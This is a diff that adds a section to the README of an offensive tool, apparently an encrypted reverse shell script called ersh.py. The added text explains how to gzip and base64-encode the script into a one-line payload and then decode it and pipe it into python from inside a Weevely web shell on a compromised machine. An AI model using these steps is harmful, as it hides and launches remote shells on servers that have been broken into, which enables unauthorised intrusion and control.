@@ -345,6 +345,18 @@ python - <<'EOF'
 'EOF'
 ```
 
+If you're trying to launch ```ersh.py``` from an environment which doesn't support multiple lines (such
+as Weevely), you can also try generating a one-liner like this:
+
+```
+root@attacker:~/freedomfighting# gzip -c ersh.py | base64
+H4sICPMsblkAA2UucHkA1Vp5k6O4kv+fT8FUx8RULdU2PsB27asXCxh8Ajbgs2eiHocwmNMcxvjT
+r4Rdd0/PvNiZjV0iqgxSKpXK45cpxJef6nma1A03rMdl5kQhdnNzg4EkdWpxiRsl/l/jPM1cEyj6
+[...]
+
+weevely> echo "H4sICPMsblkAA2..." | base64 -d | gunzip | python
+```
+
 ### Sample output
 
 On the receiver machine:
